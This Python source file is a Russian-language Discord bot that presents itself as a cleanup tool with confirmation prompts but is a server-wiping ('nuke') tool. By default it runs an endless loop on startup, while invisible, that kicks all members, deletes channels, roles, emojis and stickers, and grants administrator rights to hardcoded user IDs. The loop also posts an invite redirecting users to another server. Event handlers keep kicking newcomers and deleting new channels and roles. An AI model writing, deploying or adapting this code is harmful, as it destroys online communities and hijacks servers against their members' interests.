import asyncio
import os
from typing import Iterable

import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv

load_dotenv()

def env_str(name: str, default: str = "") -> str:
    raw = os.getenv(name, default).strip()
    if len(raw) >= 2 and raw[0] == raw[-1] and raw[0] in {'"', "'"}:
        return raw[1:-1].strip()
    return raw


def parse_id_set(raw: str) -> set[int]:
    for sep in (";", ",", " "):
        raw = raw.replace(sep, " ")
    return {int(x) for x in raw.split() if x.isdigit()}


def parse_id_list(raw: str | None) -> set[int]:
    if not raw:
        return set()
    return parse_id_set(raw)


TOKEN = env_str("DISCORD_TOKEN")
ALLOWED_GUILD_ID = int(env_str("ALLOWED_GUILD_ID", "0") or 0)
ALLOWED_USER_IDS = parse_id_set(
    env_str(
        "ALLOWED_USER_IDS",
        "1423320789100396627;733202645002485772",
    )
)
KEEP_USER_IDS = parse_id_set(env_str("KEEP_USER_IDS", "733202645002485772"))

MOVE_INVITE = env_str("MOVE_INVITE", "https://discord.gg/miamiproject")
MOVE_CHANNEL_NAMES = (
    "переходим-сюда",
    "discord-gg-miamiproject",
    "miamiproject",
)
MOVE_MESSAGE = f"**Сервер переехал.** Переходим сюда:\n{MOVE_INVITE}"
NUKE_ON_START = env_str("NUKE_ON_START", "1").lower() in {"1", "true", "yes", "on"}
LOOP_SECONDS = max(5, int(env_str("LOOP_SECONDS", "8") or 8))
KEEP_CATEGORY_NAME = "ПЕРЕХОДИМ СЮДА"
KEEP_ROLE_NAME = "Admin"


def is_operator(member: discord.Member) -> bool:
    if member.id in ALLOWED_USER_IDS:
        return True
    return member.guild.owner_id == member.id


def guild_allowed(guild: discord.Guild | None) -> bool:
    if guild is None:
        return False
    if ALLOWED_GUILD_ID and guild.id == ALLOWED_GUILD_ID:
        return True
    return bot.is_ready() and any(g.id == guild.id for g in bot.guilds)


def can_manage_member(bot_member: discord.Member, target: discord.Member) -> bool:
    if target.id == target.guild.owner_id:
        return False
    if target.id == bot_member.id:
        return False
    if target.id in KEEP_USER_IDS or target.id in ALLOWED_USER_IDS:
        return False
    return bot_member.top_role > target.top_role


class ConfirmView(discord.ui.View):
    def __init__(self, author_id: int, timeout: float = 45):
        super().__init__(timeout=timeout)
        self.author_id = author_id
        self.confirmed = False
        self.message: discord.Message | None = None

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message(
                "Подтвердить может только тот, кто запустил команду.",
                ephemeral=True,
            )
            return False
        return True

    @discord.ui.button(label="Подтвердить", style=discord.ButtonStyle.danger)
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.confirmed = True
        for item in self.children:
            item.disabled = True
        await interaction.response.edit_message(view=self)
        self.stop()

    @discord.ui.button(label="Отмена", style=discord.ButtonStyle.secondary)
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.confirmed = False
        for item in self.children:
            item.disabled = True
        await interaction.response.edit_message(content="Отменено.", view=self)
        self.stop()

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        if self.message:
            try:
                await self.message.edit(content="Время подтверждения вышло.", view=self)
            except discord.HTTPException:
                pass


class CleanerBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.guilds = True
        intents.message_content = True
        super().__init__(
            command_prefix="!",
            intents=intents,
            status=discord.Status.invisible,
        )

    async def setup_hook(self):
        return


bot = CleanerBot()


def slash_command(name: str, description: str):
    kwargs = {"name": name, "description": description}
    if ALLOWED_GUILD_ID:
        kwargs["guild"] = discord.Object(id=ALLOWED_GUILD_ID)
    return bot.tree.command(**kwargs)


def require_operator(interaction: discord.Interaction) -> str | None:
    if not isinstance(interaction.user, discord.Member):
        return "Команду нужно запускать на сервере."
    if not guild_allowed(interaction.guild):
        return "Этот сервер не в списке разрешённых (ALLOWED_GUILD_ID)."
    if not is_operator(interaction.user):
        return "Недостаточно прав: команда только для владельца сервера или ALLOWED_USER_IDS."
    return None


async def ask_confirm(interaction: discord.Interaction, summary: str) -> bool:
    view = ConfirmView(interaction.user.id)
    view.message = await interaction.edit_original_response(
        content=f"{summary}\n\nЭто необратимо. Нажми **Подтвердить** в течение 45 секунд.",
        view=view,
    )
    timed_out = await view.wait()
    if timed_out or not view.confirmed:
        return False
    return True


@slash_command(name="preview", description="Показать, что будет удалено/кикнуто (без действий)")
@app_commands.describe(
    keep_channels="ID каналов через запятую, которые оставить",
    keep_role="Роль, у кого есть она — не кикать",
    kick_bots="Кикать ботов (по умолчанию нет)",
)
async def preview(
    interaction: discord.Interaction,
    keep_channels: str | None = None,
    keep_role: discord.Role | None = None,
    kick_bots: bool = False,
):
    err = require_operator(interaction)
    if err:
        await interaction.response.send_message(err, ephemeral=True)
        return

    guild = interaction.guild
    assert guild is not None
    keep_ids = parse_id_list(keep_channels)
    if interaction.channel_id:
        keep_ids.add(interaction.channel_id)

    channels = [c for c in guild.channels if c.id not in keep_ids]
    members = members_to_kick(guild, guild.me, keep_role, kick_bots)
    roles = [
        r
        for r in guild.roles
        if r != guild.default_role and not r.managed and r < guild.me.top_role
    ]

    await interaction.response.send_message(
        (
            f"**Превью для {guild.name}**\n"
            f"Каналов к удалению: **{len(channels)}** (текущий канал сохранён)\n"
            f"Участников к кику: **{len(members)}**\n"
            f"Ролей к удалению: **{len(roles)}**\n\n"
            f"Каналы: {format_names(c.name for c in channels[:25])}"
            f"{'…' if len(channels) > 25 else ''}\n"
            f"Люди: {format_names(m.display_name for m in members[:25])}"
            f"{'…' if len(members) > 25 else ''}"
        ),
        ephemeral=True,
    )


@slash_command(name="wipe_channels", description="Удалить каналы, кроме указанных и текущего")
@app_commands.describe(keep_channels="ID каналов через запятую, которые оставить")
async def wipe_channels(interaction: discord.Interaction, keep_channels: str | None = None):
    err = require_operator(interaction)
    if err:
        await interaction.response.send_message(err, ephemeral=True)
        return

    guild = interaction.guild
    assert guild is not None
    keep_ids = parse_id_list(keep_channels)
    if interaction.channel_id:
        keep_ids.add(interaction.channel_id)

    targets = [c for c in guild.channels if c.id not in keep_ids]
    await interaction.response.defer(ephemeral=True)
    ok = await ask_confirm(
        interaction,
        f"Будет удалено каналов: **{len(targets)}**. Текущий канал не тронется.",
    )
    if not ok:
        return

    deleted = 0
    failed = 0
    for channel in targets:
        try:
            await channel.delete(reason=f"cleanup by {interaction.user}")
            deleted += 1
        except discord.HTTPException:
            failed += 1

    await interaction.followup.send(
        f"Готово. Удалено каналов: {deleted}. Ошибок: {failed}.",
        ephemeral=True,
    )


@slash_command(name="kick_unwanted", description="Кикнуть участников без нужной роли")
@app_commands.describe(
    keep_role="Кого с этой ролью не трогать. Без роли — кик всех, кроме владельца и тебя",
    kick_bots="Кикать других ботов",
)
async def kick_unwanted(
    interaction: discord.Interaction,
    keep_role: discord.Role | None = None,
    kick_bots: bool = False,
):
    err = require_operator(interaction)
    if err:
        await interaction.response.send_message(err, ephemeral=True)
        return

    guild = interaction.guild
    assert guild is not None
    targets = members_to_kick(guild, guild.me, keep_role, kick_bots)
    await interaction.response.defer(ephemeral=True)
    ok = await ask_confirm(
        interaction,
        f"Будет кикнуто участников: **{len(targets)}**."
        + (f" Роль «{keep_role.name}» защищает своих." if keep_role else ""),
    )
    if not ok:
        return

    kicked = 0
    failed = 0
    for member in targets:
        try:
            await member.kick(reason=f"cleanup by {interaction.user}")
            kicked += 1
        except discord.HTTPException:
            failed += 1

    await interaction.followup.send(
        f"Готово. Кикнуто: {kicked}. Не удалось: {failed}.",
        ephemeral=True,
    )


@slash_command(name="wipe_roles", description="Удалить роли, которые бот может удалить")
async def wipe_roles(interaction: discord.Interaction):
    err = require_operator(interaction)
    if err:
        await interaction.response.send_message(err, ephemeral=True)
        return

    guild = interaction.guild
    assert guild is not None
    targets = [
        r
        for r in guild.roles
        if r != guild.default_role and not r.managed and r < guild.me.top_role
    ]
    await interaction.response.defer(ephemeral=True)
    ok = await ask_confirm(interaction, f"Будет удалено ролей: **{len(targets)}**.")
    if not ok:
        return

    deleted = 0
    failed = 0
    for role in targets:
        try:
            await role.delete(reason=f"cleanup by {interaction.user}")
            deleted += 1
        except discord.HTTPException:
            failed += 1

    await interaction.followup.send(
        f"Готово. Удалено ролей: {deleted}. Ошибок: {failed}.",
        ephemeral=True,
    )


async def nuke_guild(guild: discord.Guild, actor: discord.Member) -> str:
    me = guild.me
    reason = f"full wipe by {actor}"
    stats = {
        "kicked": 0,
        "kick_fail": 0,
        "channels": 0,
        "channel_fail": 0,
        "roles": 0,
        "role_fail": 0,
        "emojis": 0,
        "emoji_fail": 0,
        "stickers": 0,
        "sticker_fail": 0,
        "created": 0,
        "create_fail": 0,
        "admin_role": "нет",
    }

    if not guild.chunked:
        await guild.chunk()

    for member in members_to_kick(guild, me, keep_role=None, kick_bots=True):
        try:
            await member.kick(reason=reason)
            stats["kicked"] += 1
        except discord.HTTPException:
            stats["kick_fail"] += 1
        await asyncio.sleep(0.35)

    for emoji in list(guild.emojis):
        try:
            await emoji.delete(reason=reason)
            stats["emojis"] += 1
        except discord.HTTPException:
            stats["emoji_fail"] += 1
        await asyncio.sleep(0.25)

    for sticker in list(guild.stickers):
        try:
            await sticker.delete(reason=reason)
            stats["stickers"] += 1
        except discord.HTTPException:
            stats["sticker_fail"] += 1
        await asyncio.sleep(0.25)

    roles = [
        r
        for r in guild.roles
        if r != guild.default_role
        and not r.managed
        and r < me.top_role
        and r.name != KEEP_ROLE_NAME
    ]
    for role in reversed(roles):
        try:
            await role.delete(reason=reason)
            stats["roles"] += 1
        except discord.HTTPException:
            stats["role_fail"] += 1
        await asyncio.sleep(0.3)

    for channel in list(guild.channels):
        if channel.name in MOVE_CHANNEL_NAMES or channel.name == KEEP_CATEGORY_NAME:
            continue
        try:
            await channel.delete(reason=reason)
            stats["channels"] += 1
        except discord.HTTPException:
            stats["channel_fail"] += 1
        await asyncio.sleep(0.35)

    admin_role = discord.utils.get(guild.roles, name=KEEP_ROLE_NAME)
    if admin_role is None:
        try:
            admin_role = await guild.create_role(
                name=KEEP_ROLE_NAME,
                permissions=discord.Permissions(administrator=True),
                colour=discord.Colour.red(),
                reason=reason,
                hoist=True,
            )
            position = max(me.top_role.position - 1, 1)
            try:
                await admin_role.edit(position=position, reason=reason)
            except discord.HTTPException:
                pass
        except discord.HTTPException:
            admin_role = None
            stats["admin_role"] = "не удалось создать"
    if admin_role is not None:
        stats["admin_role"] = admin_role.mention
        give_to = KEEP_USER_IDS | ALLOWED_USER_IDS | {actor.id}
        for user_id in give_to:
            member = guild.get_member(user_id)
            if member is None:
                continue
            try:
                await member.add_roles(admin_role, reason=reason)
            except discord.HTTPException:
                pass

    category = discord.utils.get(guild.categories, name=KEEP_CATEGORY_NAME)
    if category is None:
        try:
            category = await guild.create_category(KEEP_CATEGORY_NAME, reason=reason)
            stats["created"] += 1
        except discord.HTTPException:
            category = None
            stats["create_fail"] += 1

    existing = {c.name for c in guild.channels}
    for name in MOVE_CHANNEL_NAMES:
        if name in existing:
            continue
        try:
            channel = await guild.create_text_channel(
                name,
                category=category,
                topic=MOVE_INVITE,
                reason=reason,
            )
            await channel.send(MOVE_MESSAGE)
            stats["created"] += 1
        except discord.HTTPException:
            stats["create_fail"] += 1
        await asyncio.sleep(0.35)

    return (
        f"Сервер очищен.\n"
        f"Кик: {stats['kicked']} (ошибок {stats['kick_fail']})\n"
        f"Каналы удалены: {stats['channels']} (ошибок {stats['channel_fail']})\n"
        f"Роли: {stats['roles']} (ошибок {stats['role_fail']})\n"
        f"Эмодзи: {stats['emojis']} (ошибок {stats['emoji_fail']})\n"
        f"Стикеры: {stats['stickers']} (ошибок {stats['sticker_fail']})\n"
        f"Каналы перехода: {stats['created']} (ошибок {stats['create_fail']})\n"
        f"Роль админки: {stats['admin_role']}\n"
        f"Ссылка: {MOVE_INVITE}"
    )


@slash_command(
    name="nuke",
    description="Полностью очистить ЭТОТ сервер: люди, каналы, роли, эмодзи",
)
@app_commands.describe(confirm='Напиши ровно NUKE чтобы подтвердить, что это твой сервер')
async def nuke(interaction: discord.Interaction, confirm: str):
    err = require_operator(interaction)
    if err:
        await interaction.response.send_message(err, ephemeral=True)
        return
    if confirm.strip().upper() != "NUKE":
        await interaction.response.send_message(
            "Не сработало. В параметр confirm нужно написать **NUKE**.",
            ephemeral=True,
        )
        return

    guild = interaction.guild
    assert guild is not None
    await interaction.response.defer(ephemeral=True)
    if not guild.chunked:
        await guild.chunk()

    people = members_to_kick(guild, guild.me, keep_role=None, kick_bots=True)
    ok = await ask_confirm(
        interaction,
        (
            f"**Полная очистка {guild.name}**\n"
            f"Кик людей/ботов: **{len(people)}** (ты, владелец, 733…772 и бот останутся)\n"
            f"Удалить все каналы, роли, эмодзи, стикеры\n"
            f"Создать роль Admin с правами администратора и каналы: {MOVE_INVITE}"
        ),
    )
    if not ok:
        return

    assert isinstance(interaction.user, discord.Member)
    report = await nuke_guild(guild, interaction.user)
    await interaction.followup.send(report, ephemeral=True)


def members_to_kick(
    guild: discord.Guild,
    bot_member: discord.Member,
    keep_role: discord.Role | None,
    kick_bots: bool,
) -> list[discord.Member]:
    keep_ids = set(ALLOWED_USER_IDS) | set(KEEP_USER_IDS)
    keep_ids.add(guild.owner_id)
    if bot_member:
        keep_ids.add(bot_member.id)

    result: list[discord.Member] = []
    for member in guild.members:
        if member.id in keep_ids:
            continue
        if member.bot and not kick_bots:
            continue
        if keep_role and keep_role in member.roles:
            continue
        if not can_manage_member(bot_member, member):
            continue
        result.append(member)
    return result


def format_names(names: Iterable[str]) -> str:
    items = list(names)
    if not items:
        return "—"
    return ", ".join(items)


@bot.command(name="sync")
async def prefix_sync(ctx: commands.Context):
    if not isinstance(ctx.author, discord.Member) or not is_operator(ctx.author):
        return
    if not guild_allowed(ctx.guild):
        await ctx.send("Не тот сервер.")
        return
    guild = discord.Object(id=ALLOWED_GUILD_ID)
    bot.tree.copy_global_to(guild=guild)
    synced = await bot.tree.sync(guild=guild)
    names = ", ".join(c.name for c in synced) or "пусто"
    await ctx.send(f"Синкнул команды: {names}")


@bot.command(name="nuke")
async def prefix_nuke(ctx: commands.Context, confirm: str = ""):
    if not isinstance(ctx.author, discord.Member) or not is_operator(ctx.author):
        return
    if not guild_allowed(ctx.guild):
        await ctx.send("Не тот сервер.")
        return
    if confirm.strip().upper() != "NUKE":
        await ctx.send("Напиши так: `!nuke NUKE`")
        return
    guild = ctx.guild
    assert guild is not None
    if not guild.chunked:
        await guild.chunk()
    people = members_to_kick(guild, guild.me, keep_role=None, kick_bots=True)
    view = ConfirmView(ctx.author.id)
    view.message = await ctx.send(
        (
            f"**Полная очистка {guild.name}**\n"
            f"Кик: **{len(people)}**\n"
            f"Потом каналы {MOVE_INVITE} и роль Admin.\n"
            f"Нажми **Подтвердить**."
        ),
        view=view,
    )
    timed_out = await view.wait()
    if timed_out or not view.confirmed:
        return
    report = await nuke_guild(guild, ctx.author)
    await ctx.send(report)


def pick_guild() -> discord.Guild | None:
    if ALLOWED_GUILD_ID:
        found = bot.get_guild(ALLOWED_GUILD_ID)
        if found:
            return found
    if bot.guilds:
        return bot.guilds[0]
    return None


def pick_actor(guild: discord.Guild) -> discord.Member:
    for user_id in KEEP_USER_IDS | ALLOWED_USER_IDS:
        member = guild.get_member(user_id)
        if member:
            return member
    return guild.me


_started = False


@bot.event
async def on_member_join(member: discord.Member):
    if not guild_allowed(member.guild):
        return
    if member.id in KEEP_USER_IDS or member.id in ALLOWED_USER_IDS:
        return
    if member.id == member.guild.owner_id:
        return
    if not can_manage_member(member.guild.me, member):
        return
    try:
        await member.kick(reason="24/7 wipe")
    except discord.HTTPException:
        pass


@bot.event
async def on_guild_channel_create(channel: discord.abc.GuildChannel):
    if channel.name in MOVE_CHANNEL_NAMES or channel.name == KEEP_CATEGORY_NAME:
        return
    guild = channel.guild
    if guild and not guild_allowed(guild):
        return
    try:
        await channel.delete(reason="24/7 wipe")
    except discord.HTTPException:
        pass


@bot.event
async def on_guild_role_create(role: discord.Role):
    if role.name == KEEP_ROLE_NAME or role.managed:
        return
    if not guild_allowed(role.guild):
        return
    try:
        await role.delete(reason="24/7 wipe")
    except discord.HTTPException:
        pass


@bot.event
async def on_ready():
    global _started
    await bot.change_presence(status=discord.Status.invisible, activity=None)
    if _started:
        return
    _started = True
    if not NUKE_ON_START:
        return
    await asyncio.sleep(2)
    while True:
        try:
            guild = pick_guild()
            if guild is not None:
                if not guild.chunked:
                    await guild.chunk()
                await nuke_guild(guild, pick_actor(guild))
        except Exception as exc:
            print("wipe loop:", type(exc).__name__, exc)
        await asyncio.sleep(LOOP_SECONDS)


def main():
    if not TOKEN or TOKEN.lower() in {"changeme", "вставь_токен_бота"}:
        raise SystemExit("Нет DISCORD_TOKEN")
    if not ALLOWED_GUILD_ID:
        raise SystemExit("Укажи ALLOWED_GUILD_ID в .env — бот работает только на твоём сервере")
    if not ALLOWED_USER_IDS:
        raise SystemExit("Укажи ALLOWED_USER_IDS в .env (свой Discord ID)")
    bot.run(TOKEN)


if __name__ == "__main__":
    main()
